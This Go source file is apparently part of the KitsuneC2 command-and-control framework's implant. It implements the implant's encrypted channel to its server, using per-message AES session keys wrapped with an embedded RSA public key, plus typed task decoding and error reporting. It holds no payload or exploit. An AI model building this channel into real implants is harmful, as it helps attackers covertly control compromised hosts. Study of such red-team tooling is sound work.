package main

import (
	"bytes"
	"encoding/binary"
	"encoding/json"
	"errors"
	"net"
	"reflect"

	"github.com/benji-k/KitsuneC2/kitsuneC2/implant/config"
	"github.com/benji-k/KitsuneC2/kitsuneC2/lib/communication"
	"github.com/benji-k/KitsuneC2/kitsuneC2/lib/cryptography"
)

var (
	sessionKey []byte //generated randomly on each "SendEnvelopeToServer" call
)

// generates new 256-bit AES sessionKey, and encrypts the envelope datastructure with it. Then it encrypts the generated AES key
// using an RSA public key. The encrypted AES-key + encrypted envelope get sent over the wire as follows:
// Message = uint32(message length) - uint32(encryptedAESkey length) - encryptesAESkey - encryptedEnvelope
func SendEnvelopeToServer(connection net.Conn, messageType int, data interface{}) error {
	newSessionKey := cryptography.GenerateRandomBytes(32) //generate new sessionKey
	encryptedJson, err := communication.PackAndEncryptEnvelope(messageType, data, newSessionKey)
	if err != nil {
		return err
	}

	pubKey, err := cryptography.StringToRsaPublicKey(config.PublicKey)
	if err != nil {
		return err
	}
	encryptedSessionKey, err := cryptography.EncryptWithRsaPublicKey(newSessionKey, pubKey)
	if err != nil {
		return err
	}

	//create a buffer and: Append total message length, append length of RSA-encrypted session key, append RSA-encrypted session key
	//append AES encrypted envelope
	buffer := new(bytes.Buffer)
	binary.Write(buffer, binary.LittleEndian, uint32(len(encryptedJson)+len(encryptedSessionKey)+4))
	binary.Write(buffer, binary.LittleEndian, uint32(len(encryptedSessionKey)))
	buffer.Write(encryptedSessionKey)
	buffer.Write(encryptedJson)

	err = communication.WriteToSocket(connection, buffer.Bytes())
	if err != nil {
		return err
	}

	sessionKey = newSessionKey //only if everything went ok, dump our current sessionKey and set it to the new one.

	return nil
}

// Reads the first 4 bytes (uint32) from socket (message length). The reads the entire encrypted message. Afterwards, the function decrypts the message
// and attempts to unmarshal the resulting JSON into a Envelope object.
func ReceiveEnvelopeFromServer(connection net.Conn) (int, interface{}, error) {
	messageLengthAsBytes, err := communication.ReadFromSocket(connection, 4)
	if err != nil {
		return -1, nil, err
	}
	messageLength := binary.LittleEndian.Uint32(messageLengthAsBytes)

	cipherText, err := communication.ReadFromSocket(connection, int(messageLength))
	if err != nil {
		return -1, nil, err
	}
	rawJsonAsBytes, err := cryptography.DecryptAes(cipherText, sessionKey)
	if err != nil {
		return -1, nil, err
	}

	var messageEnvelope *communication.Envelope = new(communication.Envelope)
	err = json.Unmarshal(rawJsonAsBytes, messageEnvelope)
	if err != nil {
		return -1, nil, err
	}

	dataAsStruct := communication.MessageTypeToStruct[messageEnvelope.MessageType]()
	err = json.Unmarshal(messageEnvelope.Data, dataAsStruct)
	if err != nil {
		return -1, nil, errors.New("data does not correspond to messageType")
	}

	//use reflection to check that MessageType and data correspond correctly.
	expectedType := reflect.TypeOf(communication.MessageTypeToStruct[messageEnvelope.MessageType]())
	dataType := reflect.TypeOf(dataAsStruct)
	if !dataType.AssignableTo(expectedType) && !reflect.PointerTo(dataType).AssignableTo(expectedType) {
		return -1, nil, errors.New("data does not correspond to messageType")
	}

	return messageEnvelope.MessageType, dataAsStruct, nil
}

// A handler can call this function if a module fails. Calling this module completes the task on the server side, but it will
// be made clear an error was encountered.
func SendErrorToServer(connection net.Conn, taskId string, err error) error {
	resp := communication.ImplantErrorResp{TaskId: taskId, Error: err.Error()}
	return SendEnvelopeToServer(connection, communication.IMPLANT_ERROR_RESP, resp)
}
